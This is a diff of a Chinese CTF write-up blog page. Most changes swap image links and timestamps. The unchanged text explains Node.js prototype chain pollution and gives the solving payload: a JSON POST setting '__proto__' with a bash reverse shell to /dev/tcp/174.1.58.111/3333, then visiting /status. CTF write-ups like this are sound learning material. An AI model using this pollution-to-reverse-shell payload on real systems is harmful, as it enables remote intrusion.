@@ -27,14 +27,14 @@
 <meta property="og:site_name" content="Cxlover&#39;s blog">
 <meta property="og:description" content="0x00 前言​    这就是传说中的网鼎杯吗？受教惹。幸好我们3个人人都没凑齐，只是为了看题目而打比赛的，要不然非要被这比赛给气死。就这么多吧，总结一下学到的东西。 涉及知识点： 1.Nodejs的原型链污染 2.js的遍历特性">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://550532788.github.io/2020/05/11/%E9%9D%92%E9%BE%99%E7%BB%84Notes/%E9%9D%92%E9%BE%99%E7%BB%84Notes.assets/image-20200511112835792.png">
-<meta property="og:image" content="https://550532788.github.io/2020/05/11/%E9%9D%92%E9%BE%99%E7%BB%84Notes/%E9%9D%92%E9%BE%99%E7%BB%84Notes.assets/image-20200511113249038.png">
-<meta property="og:image" content="https://550532788.github.io/2020/05/11/%E9%9D%92%E9%BE%99%E7%BB%84Notes/%E9%9D%92%E9%BE%99%E7%BB%84Notes.assets/image-20200511114936489.png">
-<meta property="article:published_time" content="2020-05-11T04:01:10.004Z">
-<meta property="article:modified_time" content="2020-05-11T04:01:10.004Z">
+<meta property="og:image" content="https://images.cnblogs.com/cnblogs_com/cioi/1558332/o_200511040823image-20200511112835792.png">
+<meta property="og:image" content="https://images.cnblogs.com/cnblogs_com/cioi/1558332/o_200511040828image-20200511113249038.png">
+<meta property="og:image" content="https://images.cnblogs.com/cnblogs_com/cioi/1558332/o_200511040834image-20200511114936489.png">
+<meta property="article:published_time" content="2020-05-11T04:10:15.983Z">
+<meta property="article:modified_time" content="2020-05-11T04:10:15.983Z">
 <meta property="article:author" content="Cxlover">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://550532788.github.io/2020/05/11/%E9%9D%92%E9%BE%99%E7%BB%84Notes/%E9%9D%92%E9%BE%99%E7%BB%84Notes.assets/image-20200511112835792.png">
+<meta name="twitter:image" content="https://images.cnblogs.com/cnblogs_com/cioi/1558332/o_200511040823image-20200511112835792.png">
 
 <link rel="canonical" href="https://550532788.github.io/2020/05/11/%E9%9D%92%E9%BE%99%E7%BB%84Notes/">
 
@@ -177,7 +177,7 @@
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              <time title="Created: 2020-05-11 12:01:10" itemprop="dateCreated datePublished" datetime="2020-05-11T12:01:10+08:00">2020-05-11</time>
+              <time title="Created: 2020-05-11 12:10:15" itemprop="dateCreated datePublished" datetime="2020-05-11T12:10:15+08:00">2020-05-11</time>
             </span>
 
           
@@ -216,15 +216,15 @@
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">"script-1"</span>: <span class="string">"uptime"</span>,</span><br><span class="line">            <span class="string">"script-2"</span>: <span class="string">"free -m"</span></span><br><span class="line">        &#125;;</span><br><span class="line"><span class="keyword">var</span> a = &#123;<span class="string">"cioi"</span>:<span class="string">"nya!"</span>&#125;;</span><br><span class="line">a.__proto__.cioier = <span class="string">"cioier!nya!"</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(index);</span><br><span class="line">	<span class="built_in">console</span>.log(commands[index]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>​    猜一下控制台的运行结果是什么？</p>
-<p><img src="%E9%9D%92%E9%BE%99%E7%BB%84Notes.assets/image-20200511112835792.png" alt="image-20200511112835792"></p>
+<p><img src="https://images.cnblogs.com/cnblogs_com/cioi/1558332/o_200511040823image-20200511112835792.png" alt="img"></p>
 <p>​    为什么呢？因为<code>commands</code>和<code>a</code>其实都是对象。而他们的原型是相同的。所以你赋值<code>a</code>会出现下面的情况。</p>
-<p><img src="%E9%9D%92%E9%BE%99%E7%BB%84Notes.assets/image-20200511113249038.png" alt="image-20200511113249038"></p>
+<p><img src="https://images.cnblogs.com/cnblogs_com/cioi/1558332/o_200511040828image-20200511113249038.png" alt="img"></p>
 <p>​    可以看到造成了原型链污染。但是即便如此<code>commands</code>对象中还是没有<code>cioier</code>这个变量啊。为什么会用<code>for</code>循环遍历出一个<code>cioier</code>来？当然，我也不太明白，只知道这是<code>js</code>的一个特性。遍历时会把原型链上的东西也带上，这个之后还是要看一下。就先记住吧。</p>
 <p>​    然后我们可以利用这一点来构造<code>payload</code>。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">先去&#x2F;edit_note </span><br><span class="line">POST json格式的 &#123;&quot;raw&quot;:&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;174.1.58.111&#x2F;3333 0&gt;&amp;1&quot;,&quot;id&quot;:&quot;__proto__&quot;,&quot;author&quot;:&quot;cioier&quot;&#125;</span><br><span class="line">然后去访问 &#x2F;status 就可反弹shell的。</span><br></pre></td></tr></table></figure>
 
 <p>​    可以写一个简单的脚本更方便，不过我就直接手做了。弹到<code>shell</code>后直接获取<code>flag</code>。</p>
-<p><img src="%E9%9D%92%E9%BE%99%E7%BB%84Notes.assets/image-20200511114936489.png" alt="image-20200511114936489"></p>
+<p><img src="https://images.cnblogs.com/cnblogs_com/cioi/1558332/o_200511040834image-20200511114936489.png" alt="img"></p>
 <h3 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03 结语"></a><code>0x03</code> 结语</h3><p>​    还是比较简单的一道题目。师傅们可以找我来玩，一个人的<code>WEB</code>好无聊的说。</p>
 <p>QQ:550532788</p>
 
